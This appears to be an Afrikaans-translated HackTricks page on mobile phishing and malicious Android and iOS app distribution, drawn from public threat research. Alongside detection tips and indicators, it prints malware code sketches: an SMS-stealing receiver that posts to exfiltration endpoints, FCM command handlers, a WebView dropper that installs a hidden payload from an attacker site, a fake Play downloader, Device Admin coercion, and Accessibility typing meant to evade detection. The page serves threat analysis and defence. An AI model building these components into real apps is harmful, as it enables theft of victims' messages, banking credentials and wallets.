# Mobiele Phishing & Verspreiding van Kwaadaardige Apps (Android & iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> Hierdie bladsy dek tegnieke wat deur bedreigingsakters gebruik word om **malicious Android APKs** en **iOS mobile-configuration profiles** deur phishing (SEO, social engineering, vals winkels, dating-apps, ens.) te versprei.
> Die materiaal is aangepas van die SarangTrap-kampanje wat deur Zimperium zLabs (2025) blootgestel is en ander publieke navorsing.

## Aanvalsverloop

1. **SEO/Phishing Infrastructure**
* Registreer dosyne look-alike domeine (dating, cloud share, car service…).
– Gebruik plaaslike taal sleutelwoorde en emoji's in die `<title>` element om in Google te rank.
– Host *beide* Android (`.apk`) en iOS install instructions op dieselfde landing page.
2. **First Stage Download**
* Android: direkte skakel na 'n *unsigned* of “third-party store” APK.
* iOS: `itms-services://` of gewone HTTPS-skakel na 'n kwaadaardige **mobileconfig** profile (see below).
3. **Sosiale ingenieurswese ná installasie**
* By die eerste keer dat die app hardloop vra dit vir 'n **invitation / verification code** (illusie van eksklusiewe toegang).
* Die kode word **POSTed over HTTP** na die Command-and-Control (C2).
* C2 antwoord `{"success":true}` ➜ malware gaan voort.
* Sandbox / AV dinamiese analise wat nooit 'n geldige kode stuur nie sien **geen malicious behaviour** (ontduiking).
4. **Runtime Permission Abuse** (Android)
* Gevaarlike permissies word eers aangevra **na positiewe C2-antwoord**:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.READ_PHONE_STATE"/>
<!-- Older builds also asked for SMS permissions -->
```
* Onlangse variante **verwyder `<uses-permission>` vir SMS uit `AndroidManifest.xml`** maar laat die Java/Kotlin code path wat SMS deur reflection lees staan ⇒ verlaag die statiese telling terwyl dit steeds funksioneel bly op toestelle wat die toestemming via `AppOps`-misbruik of ou teikens toewys.
5. **Voorskynsel UI & agtergrond-insameling**
* Die app toon skynbaar onskadelike views (SMS-kijker, gallery-kiezer) wat lokaal geïmplementeer is.
* Intussen eksfiltreer dit:
- IMEI / IMSI, telefoonnommer
- Volledige `ContactsContract` dump (JSON array)
- JPEG/PNG vanaf `/sdcard/DCIM` gekomprimeer met [Luban](https://github.com/Curzibn/Luban) om grootte te verminder
- Opsionele SMS-inhoud (`content://sms`)
Payloads word **batch-zipped** en gestuur via `HTTP POST /upload.php`.
6. **iOS Delivery Technique**
* 'n Enkele **mobile-configuration profile** kan `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` ens. versoek om die toestel in 'n “MDM”-agtige toesig in te skryf.
* Sosiale-ingenieurswese instruksies:
1. Maak Settings oop ➜ *Profile downloaded*.
2. Tik drie keer op *Install* (skermkiekies op die phishing-blad).
3. Vertrou die ongetekende profiel ➜ aanvaller kry *Contacts* & *Photo* regte sonder App Store hersiening.
7. **Network Layer**
* Plain HTTP, dikwels op poort 80 met HOST header soos `api.<phishingdomain>.com`.
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (geen TLS → maklik om op te spoor).

## Red-Team Wenke

* **Dynamic Analysis Bypass** – Tydens malware-evaluering outomatiseer die uitnodigingskode-fase met Frida/Objection om die kwaadwillige tak te bereik.
* **Manifest vs. Runtime Diff** – Vergelyk `aapt dump permissions` met runtime `PackageManager#getRequestedPermissions()`; ontbrekende gevaarlike perms is 'n rooi vlag.
* **Network Canary** – Stel `iptables -p tcp --dport 80 -j NFQUEUE` op om onnatuurlike POST-pieke na kode-invoer te ontdek.
* **mobileconfig Inspection** – Gebruik `security cms -D -i profile.mobileconfig` op macOS om `PayloadContent` te lys en oormatige entitlements op te spoor.

## Nuttige Frida-snit: Outomatiese omseiling van uitnodigingskode

<details>
<summary>Frida: outomatiese omseiling van uitnodigingskode</summary>
```javascript
// frida -U -f com.badapp.android -l bypass.js --no-pause
// Hook HttpURLConnection write to always return success
Java.perform(function() {
var URL = Java.use('java.net.URL');
URL.openConnection.implementation = function() {
var conn = this.openConnection();
var HttpURLConnection = Java.use('java.net.HttpURLConnection');
if (Java.cast(conn, HttpURLConnection)) {
conn.getResponseCode.implementation = function(){ return 200; };
conn.getInputStream.implementation = function(){
return Java.use('java.io.ByteArrayInputStream').$new("{\"success\":true}".getBytes());
};
}
return conn;
};
});
```
</details>

## Aanwysers (Algemeen)
```
/req/checkCode.php        # invite code validation
/upload.php               # batched ZIP exfiltration
LubanCompress 1.1.8       # "Luban" string inside classes.dex
```
---

## Android WebView Payment Phishing (UPI) – Dropper + FCM C2 Pattern

Hierdie patroon is waargeneem in veldtogte wat government-benefit-temas misbruik om Indiese UPI credentials en OTPs te steel. Operateurs skakel betroubare platforms saam vir aflewering en veerkragtigheid.

### Afleweringsketting oor betroubare platforms
- YouTube video lokmiddel → beskrywing bevat 'n kort skakel
- Kort skakel → GitHub Pages phishing-webwerf wat die legitieme portaal naboots
- Dieselfde GitHub repo gasheer 'n APK met 'n valse “Google Play” badge wat direk na die lêer skakel
- Dynamiese phishing-bladsye word gehost op Replit; die afstandbevelkanaal gebruik Firebase Cloud Messaging (FCM)

### Dropper met ingebedde payload en offline-installasie
- Eerste APK is 'n installer (dropper) wat die werklike malware by `assets/app.apk` insluit en die gebruiker aanmoedig om Wi‑Fi/mobile data uit te skakel om cloud-detectie te versag.
- Die ingebedde payload installeer onder 'n onskuldige naam (bv. “Secure Update”). Na installasie is beide die installer en die payload as afsonderlike apps teenwoordig.

Statiese triage-wenk (grep vir ingebedde payloads):
```bash
unzip -l sample.apk | grep -i "assets/app.apk"
# Or:
zipgrep -i "classes|.apk" sample.apk | head
```
### Dynamiese endpoint-ontdekking via shortlink
- Malware haal 'n plain-text, komma-geskeide lys van aktiewe endpoints vanaf 'n shortlink; eenvoudige string-transformasies produseer die finale phishing page path.

Voorbeeld (gesanitiseer):
```
GET https://rebrand.ly/dclinkto2
Response: https://sqcepo.replit.app/gate.html,https://sqcepo.replit.app/addsm.php
Transform: "gate.html" → "gate.htm" (loaded in WebView)
UPI credential POST: https://sqcepo.replit.app/addup.php
SMS upload:           https://sqcepo.replit.app/addsm.php
```
Pseudokode:
```java
String csv = httpGet(shortlink);
String[] parts = csv.split(",");
String upiPage = parts[0].replace("gate.html", "gate.htm");
String smsPost = parts[1];
String credsPost = upiPage.replace("gate.htm", "addup.php");
```
### WebView-gebaseerde UPI credential harvesting
- Die “Make payment of ₹1 / UPI‑Lite” stap laai 'n aanvaller se HTML-form vanaf die dinamiese eindpunt binne 'n WebView en vang sensitiewe velde (telefoon, bank, UPI PIN) wat `POST`ed word na `addup.php`.

Minimal loader:
```java
WebView wv = findViewById(R.id.web);
wv.getSettings().setJavaScriptEnabled(true);
wv.loadUrl(upiPage); // ex: https://<replit-app>/gate.htm
```
### Self-propagation and SMS/OTP interception
- Agressiewe toestemmings word by die eerste uitvoering aangevra:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.SEND_SMS"/>
<uses-permission android:name="android.permission.READ_SMS"/>
<uses-permission android:name="android.permission.CALL_PHONE"/>
```
- Kontakte word deurgeloop om massaal smishing SMS vanaf die slagoffer se toestel te stuur.
- Inkomende SMS word afgevang deur 'n broadcast receiver en opgelaai met metadata (sender, body, SIM slot, per-device random ID) na `/addsm.php`.

Ontvanger-skets:
```java
public void onReceive(Context c, Intent i){
SmsMessage[] msgs = Telephony.Sms.Intents.getMessagesFromIntent(i);
for (SmsMessage m: msgs){
postForm(urlAddSms, new FormBody.Builder()
.add("senderNum", m.getOriginatingAddress())
.add("Message", m.getMessageBody())
.add("Slot", String.valueOf(getSimSlot(i)))
.add("Device rand", getOrMakeDeviceRand(c))
.build());
}
}
```
### Firebase Cloud Messaging (FCM) as weerbare C2
- Die payload registreer by FCM; push-boodskappe dra ` _type`-veld wat as 'n skakelaar gebruik word om aksies te aktiveer (bv. werk phishing-tekssjablone by, skakel gedraginge aan/af).

Voorbeeld FCM payload:
```json
{
"to": "<device_fcm_token>",
"data": {
"_type": "update_texts",
"template": "New subsidy message..."
}
}
```
Handler-skets:
```java
@Override
public void onMessageReceived(RemoteMessage msg){
String t = msg.getData().get("_type");
switch (t){
case "update_texts": applyTemplate(msg.getData().get("template")); break;
case "smish": sendSmishToContacts(); break;
// ... more remote actions
}
}
```
### Aanwysers/IOCs
- APK bevat sekondêre payload by `assets/app.apk`
- WebView laai betaling vanaf `gate.htm` en exfiltreer na `/addup.php`
- SMS-exfiltrasie na `/addsm.php`
- Shortlink-gedrewe config-ophaal (bv., `rebrand.ly/*`) wat CSV-endpunte teruggee
- Apps gemerk as generiese “Update/Secure Update”
- FCM `data`-boodskappe met 'n `_type`-discriminator in onbetroubare apps

---

## Socket.IO/WebSocket-gebaseerde APK Smuggling + vals Google Play-bladsye

Aanvallers vervang toenemend statiese APK-skakels met 'n Socket.IO/WebSocket-kanaal ingebed in lokvalle wat soos Google Play lyk. Dit verberg die payload-URL, omseil URL-/uitbreidingsfilters, en behou 'n realistiese installasie-UX.

Tipiese kliëntvloei wat in die wild waargeneem is:

<details>
<summary>Socket.IO vals Play aflaaier (JavaScript)</summary>
```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
const url = URL.createObjectURL(blob);
const a = document.createElement("a");
a.href = url; a.download = "app.apk"; a.style.display = "none";
document.body.appendChild(a); a.click();
});
```
</details>

Waarom dit eenvoudige kontroles omseil:
- Geen statiese APK URL word blootgestel; payload word in geheue heropgebou uit WebSocket frames.
- URL/MIME/extension filters wat direkte .apk-antwoorde blokkeer, kan binaire data wat via WebSockets/Socket.IO getunnel word, misloop.
- Crawlers en URL-sandboxes wat WebSockets nie uitvoer nie, sal die payload nie opvraag nie.

Sien ook WebSocket tradecraft and tooling:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## Android Accessibility/Overlay & Device Admin Abuse, ATS automation, and NFC relay orchestration – RatOn gevallestudie

Die RatOn banker/RAT campaign (ThreatFabric) is 'n konkrete voorbeeld van hoe moderne mobile phishing operations WebView droppers, Accessibility-driven UI automation, overlays/ransom, Device Admin coercion, Automated Transfer System (ATS), crypto wallet takeover, en selfs NFC-relay orchestration kombineer. Hierdie afdeling abstraheer die herbruikbare tegnieke.

### Stage-1: WebView → native install bridge (dropper)
Aanvallers toon 'n WebView wat na 'n aanvaller-bladsy wys en injecteer 'n JavaScript-koppelvlak wat 'n native installer blootstel. 'n Tik op 'n HTML-knoppie roep native kode aan wat 'n tweede-stadium APK installeer wat in die dropper se assets gebundel is en dit dan direk lanceer.

Minimale patroon:

<details>
<summary>Stage-1 dropper minimale patroon (Java)</summary>
```java
public class DropperActivity extends Activity {
@Override protected void onCreate(Bundle b){
super.onCreate(b);
WebView wv = new WebView(this);
wv.getSettings().setJavaScriptEnabled(true);
wv.addJavascriptInterface(new Object(){
@android.webkit.JavascriptInterface
public void installApk(){
try {
PackageInstaller pi = getPackageManager().getPackageInstaller();
PackageInstaller.SessionParams p = new PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL);
int id = pi.createSession(p);
try (PackageInstaller.Session s = pi.openSession(id);
InputStream in = getAssets().open("payload.apk");
OutputStream out = s.openWrite("base.apk", 0, -1)){
byte[] buf = new byte[8192]; int r; while((r=in.read(buf))>0){ out.write(buf,0,r);} s.fsync(out);
}
PendingIntent status = PendingIntent.getBroadcast(this, 0, new Intent("com.evil.INSTALL_DONE"), PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
pi.commit(id, status.getIntentSender());
} catch (Exception e) { /* log */ }
}
}, "bridge");
setContentView(wv);
wv.loadUrl("https://attacker.site/install.html");
}
}
```
</details>

HTML op die bladsy:
```html
<button onclick="bridge.installApk()">Install</button>
```
Na installasie begin die dropper die payload via explicit package/activity:
```java
Intent i = new Intent();
i.setClassName("com.stage2.core", "com.stage2.core.MainActivity");
startActivity(i);
```
Opsporingsidee: onbetroubare apps wat `addJavascriptInterface()` aanroep en installer-agtige metodes aan WebView blootstel; APK wat 'n ingeslote sekondêre payload onder `assets/` aflewer en die Package Installer Session API aanroep.

### Toestemmingsproses: Accessibility + Device Admin + follow-on runtime prompts
Fase-2 open 'n WebView wat 'n “Access” bladsy aanbied. Sy knoppie roep 'n ge-exporteerde metode aan wat die slagoffer na die Accessibility-instellings navigeer en versoek om die kwaadwillige diens te aktiveer. Sodra dit toegestaan is, gebruik die malware Accessibility om outomaties deur die volgende runtime-magtigingsdialoë te klik (contacts, overlay, manage system settings, ens.) en versoek Device Admin.

- Accessibility help programmaties om later versoeke te aanvaar deur knoppies soos “Allow”/“OK” in die node-tree te vind en klikke te stuur.
- Overlay permission check/request:
```java
if (!Settings.canDrawOverlays(ctx)) {
Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
Uri.parse("package:" + ctx.getPackageName()));
ctx.startActivity(i);
}
```
Sien ook:

{{#ref}}
../../mobile-pentesting/android-app-pentesting/accessibility-services-abuse.md
{{#endref}}

### Overlay-phishing/losprys deur WebView
Operateurs kan opdragte uitreik om:
- 'n volskerm-overlay vanaf 'n URL te toon, of
- inline HTML deur te gee wat in 'n WebView-overlay gelaai word.

Waarskynlike gebruike: dwang (PIN-invoer), wallet-ouvrirng om PIN's vas te vang, losprysboodskappe. Hou 'n opdrag om te verseker dat overlay-toestemming toegeken is indien dit ontbreek.

### Afstandsbeheer-model – teks pseudo-skerm + skermuitsending
- Lae bandwydte: dump periodiek die Accessibility node-boom, serialiseer sigbare tekste/rolle/begrenzings en stuur na C2 as 'n pseudo-skerm (opdragte soos `txt_screen` eenmalig en `screen_live` deurlopend).
- Hoë getrouheid: versoek MediaProjection en begin skermuitsending/opname op aanvraag (opdragte soos `display` / `record`).

### ATS playbook (bank-app-automatisering)
Gegewe 'n JSON-taak, open die bank-app, bestuur die UI via Accessibility met 'n mengsel van teksnavrae en koördinaat-tappe, en voer die slagoffer se betalings-PIN in wanneer gevra.

Voorbeeldtaak:
```json
{
"cmd": "transfer",
"receiver_address": "ACME s.r.o.",
"account": "123456789/0100",
"amount": "24500.00",
"name": "ACME"
}
```
Voorbeeldtekste gesien in een teikenvloei (CZ → EN):
- "Nová platba" → "Nuwe betaling"
- "Zadat platbu" → "Voer betaling in"
- "Nový příjemce" → "Nuwe ontvanger"
- "Domácí číslo účtu" → "Nasionale rekeningnommer"
- "Další" → "Volgende"
- "Odeslat" → "Stuur"
- "Ano, pokračovat" → "Ja, gaan voort"
- "Zaplatit" → "Betaal"
- "Hotovo" → "Klaar"

Operateurs kan ook oordraglimiete nagaan/verhoog via opdragte soos `check_limit` en `limit` wat soortgelyk die limiete-UI navigeer.

### Crypto wallet seed uittrekking
Teikens soos MetaMask, Trust Wallet, Blockchain.com, Phantom. Vloei: ontsluit (gesteelde PIN of voorsiene wagwoord), navigeer na Security/Recovery, openbaar/vertoon seed phrase, keylog/exfiltrate dit. Implementeer locale-aware selectors (EN/RU/CZ/SK) om die navigasie oor tale te stabiliseer.

### Device Admin dwang
Device Admin APIs word gebruik om PIN-vastleggingsgeleenthede te verhoog en die slagoffer te frustreer:

- Onmiddellike sluit:
```java
dpm.lockNow();
```
- Laat huidige inlogbewys verval om verandering af te dwing (Accessibility vang nuwe PIN/wagwoord):
```java
dpm.setPasswordExpirationTimeout(admin, 1L); // requires admin / often owner
```
- Dwing nie-biometriese ontsluiting af deur keyguard se biometriese funksies uit te skakel:
```java
dpm.setKeyguardDisabledFeatures(admin,
DevicePolicyManager.KEYGUARD_DISABLE_FINGERPRINT |
DevicePolicyManager.KEYGUARD_DISABLE_TRUST_AGENTS);
```
Let wel: Baie DevicePolicyManager-beheer vereis Device Owner/Profile Owner op onlangse Android; sommige OEM builds mag losser wees. Valideer altyd op teiken OS/OEM.

### NFC relay orchestration (NFSkate)
Stage-3 kan 'n eksterne NFC-relay-module installeer en lanseer (bv. NFSkate) en selfs 'n HTML-sjabloon daaraan oorhandig om die slagoffer tydens die relay te lei. Dit maak kontaklose card-present cash-out langs aanlyn ATS moontlik.

Achtergrond: [NFSkate NFC relay](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay).

### Operator opdragstel (voorbeeld)
- UI/toestand: `txt_screen`, `screen_live`, `display`, `record`
- Sosiaal: `send_push`, `Facebook`, `WhatsApp`
- Oorleggings: `overlay` (inline HTML), `block` (URL), `block_off`, `access_tint`
- Wallets: `metamask`, `trust`, `blockchain`, `phantom`
- ATS: `transfer`, `check_limit`, `limit`
- Toestel: `lock`, `expire_password`, `disable_keyguard`, `home`, `back`, `recents`, `power`, `touch`, `swipe`, `keypad`, `tint`, `sound_mode`, `set_sound`
- Kommunikasie/Recon: `update_device`, `send_sms`, `replace_buffer`, `get_name`, `add_contact`
- NFC: `nfs`, `nfs_inject`

### Toeganklikheidsgedrewe ATS anti-detectie: mens-agtige teks-kadens en dubbele teksinspuiting (Herodotus)

Dreigspelers meng toenemend Toeganklikheidsgedrewe outomatisering met anti-detectie afgestel teen basiese gedragsbiometrieë. 'n Onlangse banker/RAT vertoon twee komplementêre teks-afleweringsmodusse en 'n operator-skakelaar om menslike tikgedrag met gerandomiseerde kadens te simuleer.

- Ontdekkingsmodus: enumereer sigbare node met selectors en bounds om insette presies te teiken (ID, text, contentDescription, hint, bounds) voordat opgetree word.
- Dubbele teksinspuiting:
- Modus 1 – `ACTION_SET_TEXT` direk op die teiken-node (stabiel, geen sleutelbord);
- Modus 2 – clipboard set + `ACTION_PASTE` in die gefokusde node (werk wanneer direkte setText geblokkeer is).
- Mens-agtige kadens: verdeel die deur die operator verskafde string en lewer dit karakter-vir-karakter met gerandomiseerde 300–3000 ms vertragings tussen gebeure om “machine-speed typing” heuristieke te ontduik. Geïmplementeer óf deur die waarde progressief te vergroot via `ACTION_SET_TEXT`, óf deur een karakter op 'n slag te plak.

<details>
<summary>Java-skets: node-ontdekking + vertraagde per-karakter inset via setText of clipboard+paste</summary>
```java
// Enumerate nodes (HVNCA11Y-like): text, id, desc, hint, bounds
void discover(AccessibilityNodeInfo r, List<String> out){
if (r==null) return; Rect b=new Rect(); r.getBoundsInScreen(b);
CharSequence id=r.getViewIdResourceName(), txt=r.getText(), cd=r.getContentDescription();
out.add(String.format("cls=%s id=%s txt=%s desc=%s b=%s",
r.getClassName(), id, txt, cd, b.toShortString()));
for(int i=0;i<r.getChildCount();i++) discover(r.getChild(i), out);
}

// Mode 1: progressively set text with randomized 300–3000 ms delays
void sendTextSetText(AccessibilityNodeInfo field, String s) throws InterruptedException{
String cur = "";
for (char c: s.toCharArray()){
cur += c; Bundle b=new Bundle();
b.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, cur);
field.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, b);
Thread.sleep(300 + new java.util.Random().nextInt(2701));
}
}

// Mode 2: clipboard + paste per-char with randomized delays
void sendTextPaste(AccessibilityService svc, AccessibilityNodeInfo field, String s) throws InterruptedException{
field.performAction(AccessibilityNodeInfo.ACTION_FOCUS);
ClipboardManager cm=(ClipboardManager) svc.getSystemService(Context.CLIPBOARD_SERVICE);
for (char c: s.toCharArray()){
cm.setPrimaryClip(ClipData.newPlainText("x", Character.toString(c)));
field.performAction(AccessibilityNodeInfo.ACTION_PASTE);
Thread.sleep(300 + new java.util.Random().nextInt(2701));
}
}
```
</details>

Blokkeeroverlays om bedrog te maskeer:
- Wys 'n volskerm-`TYPE_ACCESSIBILITY_OVERLAY` met operateur-beheerde deursigtigheid; hou dit ondeursigtig vir die slagoffer terwyl afgeleë automatisering daaronder voortgaan.
- Tipies blootgestelde opdragte: `opacityOverlay <0..255>`, `sendOverlayLoading <html/url>`, `removeOverlay`.

Minimale overlay met verstelbare alpha:
```java
View v = makeOverlayView(ctx); v.setAlpha(0.92f); // 0..1
WindowManager.LayoutParams lp = new WindowManager.LayoutParams(
MATCH_PARENT, MATCH_PARENT,
WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
PixelFormat.TRANSLUCENT);
wm.addView(v, lp);
```
Operator-beheerprimitiewe wat dikwels gesien word: `BACK`, `HOME`, `RECENTS`, `CLICKTXT`/`CLICKDESC`/`CLICKELEMENT`/`CLICKHINT`, `TAP`/`SWIPE`, `NOTIFICATIONS`, `OPNPKG`, `VNC`/`VNCA11Y` (skermdeling).

## Verwysings

- [New Android Malware Herodotus Mimics Human Behaviour to Evade Detection](https://www.threatfabric.com/blogs/new-android-malware-herodotus-mimics-human-behaviour-to-evade-detection)

- [The Dark Side of Romance: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [Luban – Android image compression library](https://github.com/Curzibn/Luban)
- [Android Malware Promises Energy Subsidy to Steal Financial Data (McAfee Labs)](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/android-malware-promises-energy-subsidy-to-steal-financial-data/)
- [Firebase Cloud Messaging — Docs](https://firebase.google.com/docs/cloud-messaging)
- [The Rise of RatOn: From NFC heists to remote control and ATS (ThreatFabric)](https://www.threatfabric.com/blogs/the-rise-of-raton-from-nfc-heists-to-remote-control-and-ats)
- [GhostTap/NFSkate – NFC relay cash-out tactic (ThreatFabric)](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay)
- [Banker Trojan Targeting Indonesian and Vietnamese Android Users (DomainTools)](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
- [DomainTools SecuritySnacks – ID/VN Banker Trojans (IOCs)](https://github.com/DomainTools/SecuritySnacks/blob/main/2025/BankerTrojan-ID-VN)
- [Socket.IO](https://socket.io)

{{#include ../../banners/hacktricks-training.md}}
